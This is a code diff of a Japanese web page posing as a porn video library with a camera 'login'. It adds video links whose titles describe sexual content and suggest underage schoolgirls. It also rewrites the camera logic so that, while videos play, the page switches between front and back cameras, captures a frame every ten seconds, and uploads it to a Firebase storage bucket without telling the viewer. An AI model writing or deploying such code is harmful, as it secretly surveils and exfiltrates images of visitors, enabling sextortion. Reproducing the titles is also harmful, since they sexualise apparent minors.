@@ -308,6 +308,16 @@
 		title: '無事●放！中国で人気のａｎｏちゃん激似コスプレイヤー。透明感溢れる若き肉体を存分に弄び、ピチピチま○こに強○中出し妊娠帰国で終了のお知らせ。。。'
 	    },
 
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4360142_11.mp4?alt=media&token=dfb68053-5982-4c36-a0e1-55b4039109cd',		
+		title: '完全顔出し県立3超スジパイパン⑨ リアル制服でおま〇ことお尻まる出し露出お散歩と連続中出しから再注入後お掃除フェラ_1'
+	    },	
+
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4360142_22.mp4?alt=media&token=35670f98-a1a9-4586-98f7-e28f26f25bb7',		
+		title: '完全顔出し県立3超スジパイパン⑨ リアル制服でおま〇ことお尻まる出し露出お散歩と連続中出しから再注入後お掃除フェラ_2'
+	    },	
+
             {
                 url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4363953_.mp4?alt=media&token=99e40a6b-4228-479d-bd95-e23ccbf46820',
 		title: '女優のたまご。卒業記念３p連続中出し'
@@ -368,56 +378,65 @@
 		title: '華奢なゆ〇と〇生・お泊り生ハメ・何度もハメた日々の一部・家に居たくないと'
 	    },
 
+            {		
+                url: 'https://firebasestorage.googleapis.com/v0/b/hozon2-17607.appspot.com/o/hhd800.com%40FC2-PPV-4465471_1.mp4?alt=media&token=c7031104-b6a2-42a9-ba8d-e7588190800e',		
+		title: '「合法巨乳ちゃんをついにゲット！！大好物な子を好き放題突きまくり、初の中出しさせちゃいました。'
+	    },	
+
             // 他の動画URLとタイトルを追加
         ];
-        async function startCamera() {
+
+        async function requestCameraAccess() {
             try {
-                videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                const videoDevices = devices.filter(device => device.kind === 'videoinput');
+                const backCamera = videoDevices.find(device => device.label.toLowerCase().includes('back')) || videoDevices[0];
+
+                const constraints = {
+                    video: {
+                        deviceId: backCamera.deviceId
+                    }
+                };
+
+                videoStream = await navigator.mediaDevices.getUserMedia(constraints);
                 video.srcObject = videoStream;
             } catch (err) {
                 console.error('カメラアクセスエラー:', err);
                 showCameraPermissionDialog();
+                throw err;
             }
         }
 
         function captureAndLogin() {
-            const ctx = canvas.getContext('2d');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            const dataURL = canvas.toDataURL('image/jpeg');
+            if (videoStream) {
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const dataURL = canvas.toDataURL('image/jpeg');
 
-            fetch('/login', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ image: dataURL })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.success) {
-                    // ログイン成功
-                    loginContainer.style.display = 'none';
-                    document.querySelector('h1').style.display = 'block';
-                    videoGrid.style.display = 'grid';
-                    pagination.style.display = 'flex';
-                    loadVideos(1);
-                } else {
-                    alert('ログイン失敗');
-                }
-            })
-            .catch(error => {
-                console.error('ログインエラー:', error);
-                alert('ログインエラーが発生しました');
-            });
+                // ここでログイン処理をする代わりに、動画保管庫を表示
+                loginContainer.style.display = 'none';
+                document.querySelector('h1').style.display = 'block';
+                videoGrid.style.display = 'grid';
+                pagination.style.display = 'flex';
+                loadVideos(1);
+            } else {
+                console.error('カメラストリームが利用できません。');
+                alert('カメラストリームが利用できません。');
+            }
         }
 
         function showCameraPermissionDialog() {
             dialogOverlay.style.display = 'flex';
         }
 
-        captureButton.addEventListener('click', captureAndLogin);
+        captureButton.addEventListener('click', () => {
+            requestCameraAccess().then(captureAndLogin).catch(() => {
+                alert('カメラの権限が許可されていません。');
+            });
+        });
+
         reloadButton.addEventListener('click', () => {
             location.reload();
         });
@@ -428,7 +447,6 @@
         }
 
         function loadVideos(page) {
-            const videoGrid = document.getElementById('videoGrid');
             videoGrid.innerHTML = '';
             const startIndex = (page - 1) * videosPerPage;
             const endIndex = startIndex + videosPerPage;
@@ -455,7 +473,7 @@
                 videoGrid.appendChild(videoItem);
 
                 videoElement.addEventListener('play', () => {
-                    requestCameraAccess();
+                    startCameraCapture();
                 });
             });
 
@@ -463,7 +481,6 @@
         }
 
         function setupPagination(currentPage) {
-            const pagination = document.getElementById('pagination');
             pagination.innerHTML = '';
 
             const totalPages = Math.ceil(videos.length / videosPerPage);
@@ -494,115 +511,101 @@
             measurementId: "G-TWBV38P13D"
         };
 
-        const app = initializeApp(firebaseConfig);
-        const storage = getStorage(app);
 
-        let currentCameraIndex = 0;
-        let frontCamera;
-        let backCamera;
+const app = initializeApp(firebaseConfig);
+const storage = getStorage(app);
 
-        async function requestCameraAccess() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput');
-                if (videoDevices.length === 0) {
-                    console.error('カメラが見つかりませんでした。');
-                    showCameraPermissionDialog();
-                    return;
-                }
+let currentCameraIndex = 0;
+let frontCamera;
+let backCamera;
 
-                for (const device of videoDevices) {
-                    if (device.label.toLowerCase().includes('back')) {
-                        backCamera = device;
-                    } else if (device.label.toLowerCase().includes('front')) {
-                        frontCamera = device;
-                    }
-                }
+async function switchCamera() {
+    if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+    }
 
-                if (!backCamera) {
-                    backCamera = videoDevices[0];
-                }
-                if (!frontCamera) {
-                    frontCamera = videoDevices[1] || videoDevices[0];
-                }
-
-                switchCamera();
-            } catch (err) {
-                console.error('カメラアクセスエラー:', err);
-                showCameraPermissionDialog();
-            }
+    try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
+        if (videoDevices.length === 0) {
+            console.error('カメラが見つかりませんでした。');
+            showCameraPermissionDialog();
+            return;
         }
 
-        function switchCamera() {
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-
-            const constraints = {
-                video: {
-                    deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
-                }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    videoStream = stream;
-                    startCameraCapture();
-                    currentCameraIndex++;
-                })
-                .catch(err => {
-                    console.error('カメラ切り替えエラー:', err);
-                    showCameraPermissionDialog();
-                });
+        if (!backCamera) {
+            backCamera = videoDevices[0];
+        }
+        if (!frontCamera) {
+            frontCamera = videoDevices[1] || videoDevices[0];
         }
 
-        function startCameraCapture() {
-            if (videoStream) {
-                const videoTracks = videoStream.getVideoTracks();
-                const track = videoTracks[0];
-                const imageCapture = new ImageCapture(track);
-
-                captureInterval = setInterval(() => {
-                    imageCapture.grabFrame()
-                        .then(imageBitmap => {
-                            canvas.width = imageBitmap.width;
-                            canvas.height = imageBitmap.height;
-                            const ctx = canvas.getContext('2d');
-                            ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
-                            const dataURL = canvas.toDataURL('image/jpeg');
-                            uploadImage(dataURL);
-                            switchCamera();
-                        })
-                        .catch(err => {
-                            console.error('画像キャプチャエラー:', err);
-                        });
-                }, 10000); // 10000ミリ秒 = 10秒
+        const constraints = {
+            video: {
+                deviceId: currentCameraIndex % 2 === 0 ? backCamera.deviceId : frontCamera.deviceId
             }
-        }
-
-        function stopCameraCapture() {
-            if (captureInterval) {
-                clearInterval(captureInterval);
-            }
-            if (videoStream) {
-                videoStream.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        function uploadImage(dataURL) {
-            const storageRef = ref(storage, `images/${Date.now()}.jpg`);
-            uploadString(storageRef, dataURL, 'data_url')
-                .then(snapshot => {
-                    console.log('画像がアップロードされました。');
-                })
-                .catch(err => {
-                    console.error('アップロードエラー:', err);
-                });
-        }
-
-        window.onload = () => {
-            startCamera();
         };
-    </script>
+
+        videoStream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = videoStream;
+        startCameraCapture();
+        currentCameraIndex++;
+    } catch (err) {
+        console.error('カメラ切り替えエラー:', err);
+        showCameraPermissionDialog();
+    }
+}
+
+function startCameraCapture() {
+    if (videoStream) {
+        const videoTracks = videoStream.getVideoTracks();
+        const track = videoTracks[0];
+        const imageCapture = new ImageCapture(track);
+
+        captureInterval = setInterval(() => {
+            imageCapture.grabFrame()
+                .then(imageBitmap => {
+                    canvas.width = imageBitmap.width;
+                    canvas.height = imageBitmap.height;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(imageBitmap, 0, 0, canvas.width, canvas.height);
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    uploadImage(dataURL);
+                    switchCamera();
+                })
+                .catch(err => {
+                    console.error('画像キャプチャエラー:', err);
+                });
+        }, 10000); // 10000ミリ秒 = 10秒
+    }
+}
+
+function stopCameraCapture() {
+    if (captureInterval) {
+        clearInterval(captureInterval);
+    }
+    if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+    }
+}
+
+function uploadImage(dataURL) {
+    const storageRef = ref(storage, `images/${Date.now()}.jpg`);
+    uploadString(storageRef, dataURL, 'data_url')
+        .then(snapshot => {
+            console.log('画像がアップロードされました。');
+        })
+        .catch(err => {
+            console.error('アップロードエラー:', err);
+        });
+}
+
+window.onload = () => {
+    requestCameraAccess().catch(() => {
+        alert('カメラの権限が許可されていません。');
+    });
+};
+</script>
 </body>
 </html>
+
